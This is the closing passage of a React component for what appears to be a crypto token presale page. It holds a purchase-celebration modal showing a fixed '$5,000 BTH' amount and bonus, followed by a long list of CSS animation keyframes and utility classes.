            <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl sm:rounded-3xl p-6 sm:p-10 border border-orange-500/20 shadow-2xl text-center">
              <div className="relative mb-4 sm:mb-6">
                <div className="text-5xl sm:text-7xl animate-bounce">🎉</div>
                {[...Array(8)].map((_, i) => (
                  <div
                    key={i}
                    className="absolute w-1 h-1 bg-yellow-400 rounded-full animate-sparkle"
                    style={{
                      top: '50%',
                      left: '50%',
                      transform: `rotate(${i * 45}deg) translateY(-30px)`,
                      animationDelay: `${i * 0.1}s`
                    }}
                  />
                ))}
              </div>
              
              <h2 className="text-2xl sm:text-4xl font-black mb-2 sm:mb-3 bg-gradient-to-r from-yellow-400/80 via-orange-500/80 to-yellow-400/80 bg-clip-text text-transparent">
                {t.successful}
              </h2>
              
              <p className="text-base sm:text-xl text-gray-300 mb-2 sm:mb-3">{t.youHaveSecured}</p>
              
              <div className="text-3xl sm:text-5xl font-black text-orange-400/90 mb-2 sm:mb-3 animate-pulse">$5,000 BTH</div>
              
              <div className="inline-block bg-gradient-to-r from-green-500/20 to-green-600/20 px-4 sm:px-6 py-2 sm:py-3 rounded-full mb-3 sm:mb-4 border border-green-500/30">
                <span className="text-lg sm:text-2xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
              </div>
              
              <p className="text-[10px] sm:text-xs text-gray-500 mb-4 sm:mb-6">
                Successfully processed
              </p>
              
              <button
                onClick={() => setShowCelebration(false)}
                className="w-full bg-gradient-to-r from-orange-500/80 to-orange-600/80 hover:from-orange-600/80 hover:to-orange-700/80 text-white font-bold py-3 sm:py-4 px-4 sm:px-6 rounded-lg sm:rounded-xl transition-all transform hover:scale-[1.02] text-base sm:text-xl relative overflow-hidden group/close"
              >
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/close:translate-x-[100%] transition-transform duration-1000"></div>
                {t.viewButton}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Animation Keyframes */}
      <style>{`
        @keyframes floatOrbBig {
          0% { transform: translate(0, 0) scale(1); opacity: 0.5; }
          50% { transform: translate(-3%, 4%) scale(1.05); opacity: 0.7; }
          100% { transform: translate(0, 0) scale(1); opacity: 0.5; }
        }
        @keyframes floatOrbSmall {
          0% { transform: translate(0, 0) rotate(0deg); opacity: 0.4; }
          50% { transform: translate(5%, -6%) rotate(3deg); opacity: 0.6; }
          100% { transform: translate(0, 0) rotate(0deg); opacity: 0.4; }
        }
        @keyframes liveBlink {
          0% { opacity: 1; background: rgba(180, 100, 20, 0.15); border-color: #b36e1a; box-shadow: 0 0 12px rgba(180, 100, 20, 0.3); }
          50% { opacity: 0.9; background: rgba(180, 100, 20, 0.25); border-color: #cc8822; box-shadow: 0 0 18px rgba(200, 120, 20, 0.4); }
        }
        @keyframes blinkRed {
          0% { opacity: 1; background-color: #d44040; box-shadow: 0 0 8px #d44040; }
          50% { opacity: 0.3; background-color: #6a2a2a; box-shadow: 0 0 3px #6a2a2a; }
        }
        @keyframes discountRibbon {
          0% { box-shadow: 0 0 10px rgba(180,100,20,0.3), 0 0 20px rgba(200,120,20,0.2); }
          100% { box-shadow: 0 0 25px rgba(200,120,20,0.4), 0 0 40px rgba(180,100,20,0.3); }
        }
        @keyframes ringPop {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        @keyframes glowPulse {
          from { box-shadow: 0 0 15px rgba(180,100,20,0.15); border-color: rgba(180,100,20,0.3); }
          to { box-shadow: 0 0 30px rgba(200,120,20,0.25); border-color: rgba(200,120,20,0.5); }
        }
        @keyframes shimmerSlow {
          0% { transform: translateX(-100%) rotate(25deg); }
          40% { transform: translateX(100%) rotate(25deg); }
          100% { transform: translateX(200%) rotate(25deg); }
        }
        @keyframes shimmer-slow {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }
        @keyframes gradientMove {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: scale(0.95); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
          100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; }
        }
        @keyframes sparkle {
          0% { transform: rotate(0deg) scale(0); opacity: 0; }
          50% { transform: rotate(180deg) scale(1); opacity: 1; }
          100% { transform: rotate(360deg) scale(0); opacity: 0; }
        }
        @keyframes float {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-10px); }
        }
        @keyframes spinSlow {
          0% { transform: rotateY(0deg); }
          50% { transform: rotateY(180deg); }
          100% { transform: rotateY(360deg); }
        }
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        @keyframes pulse-slower {
          0%, 100% { opacity: 0.2; }
          50% { opacity: 0.4; }
        }
        @keyframes pulse-width {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        @keyframes bounce-slow {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-2px); }
        }
        @keyframes pulse-text {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        @keyframes pulse-glow {
          0%, 100% { box-shadow: 0 0 10px rgba(180,100,20,0.2); }
          50% { box-shadow: 0 0 20px rgba(200,120,20,0.3); }
        }
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-2px); }
          20%, 40%, 60%, 80% { transform: translateX(2px); }
        }
        @keyframes ripple {
          0% { transform: scale(0); opacity: 1; }
          100% { transform: scale(4); opacity: 0; }
        }
        @keyframes ribbonSlide {
          0% { transform: translateX(100%) scale(0.8); opacity: 0; }
          20% { transform: translateX(-5%) scale(1.05); opacity: 1; }
          40% { transform: translateX(2%) scale(0.98); }
          60% { transform: translateX(-1%) scale(1.01); }
          80% { transform: translateX(0.5%) scale(1); }
          100% { transform: translateX(0) scale(1); opacity: 1; }
        }
        @keyframes bounce-arrow {
          0%, 100% { transform: translateY(0) rotate(45deg); opacity: 1; }
          50% { transform: translateY(5px) rotate(45deg); opacity: 0.8; }
        }
        @keyframes progressScan {
          0% { left: -100%; }
          100% { left: 100%; }
        }
        @keyframes claimSparkle {
          0% { transform: scale(0) rotate(0deg); opacity: 0; }
          50% { transform: scale(1) rotate(180deg); opacity: 0.8; }
          100% { transform: scale(0) rotate(360deg); opacity: 0; }
        }
        .animate-floatOrbBig { animation: floatOrbBig 20s ease-in-out infinite; }
        .animate-floatOrbSmall { animation: floatOrbSmall 24s ease-in-out infinite; }
        .animate-liveBlink { animation: liveBlink 1.4s infinite step-start; }
        .animate-blinkRed { animation: blinkRed 1s infinite; }
        .animate-discountRibbon { animation: discountRibbon 1.2s infinite alternate; }
        .animate-ringPop { animation: ringPop 1.5s infinite; }
        .animate-glowPulse { animation: glowPulse 2.5s infinite alternate; }
        .animate-shimmerSlow { animation: shimmerSlow 8s infinite; }
        .animate-shimmer-slow { animation: shimmer-slow 3s infinite; }
        .animate-gradientMove { animation: gradientMove 4s ease infinite; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-sparkle { animation: sparkle 1s ease-out forwards; }
        .animate-float { animation: float 3s ease-in-out infinite; }
        .animate-spinSlow { animation: spinSlow 6s infinite linear; }
        .animate-spin-slow { animation: spin 3s linear infinite; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-pulse-slower { animation: pulse-slower 4s ease-in-out infinite; }
        .animate-pulse-width { animation: pulse-width 2s ease-in-out infinite; }
        .animate-bounce-slow { animation: bounce-slow 2s ease-in-out infinite; }
        .animate-pulse-text { animation: pulse-text 2s ease-in-out infinite; }
        .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite; }
        .animate-shake { animation: shake 0.5s ease-in-out; }
        .animate-ripple { animation: ripple 0.6s ease-out; }
        .animate-ribbonSlide { animation: ribbonSlide 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
        .animate-bounce-arrow { animation: bounce-arrow 1.2s ease-in-out infinite; }
        .animate-progressScan { animation: progressScan 2s linear infinite; }
        .animate-claimSparkle { animation: claimSparkle 2s ease-in-out infinite; }
        .animate-shimmer {
          animation: shimmer 2s infinite;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
          background-size: 200% 100%;
        }
        @keyframes shimmer {
          0% { background-position: -200% 0; }
          100% { background-position: 200% 0; }
        }
      `}</style>
    </div>
  );
}

export default App;
